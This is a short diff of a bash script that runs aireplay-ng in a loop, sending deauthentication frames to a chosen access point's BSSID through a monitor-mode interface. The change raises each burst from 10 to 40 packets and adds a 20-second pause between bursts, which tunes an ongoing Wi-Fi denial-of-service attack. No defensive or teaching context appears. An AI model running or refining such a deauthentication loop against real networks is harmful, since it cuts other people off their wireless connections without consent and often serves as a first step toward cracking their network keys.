@@ -29,13 +29,14 @@ do
 		sleep 3
 		while :
 		do
-			aireplay-ng --deauth 10 -a $var_bssid wlan0mon
+			aireplay-ng --deauth 40 -a $var_bssid wlan0mon
 		
 			if [ $? -ne 0 ]; then 
 			pkill airodump-ng
 			break
 			else 
 			echo "Sí está en canal";
+			sleep 20
 
 			fi
 		
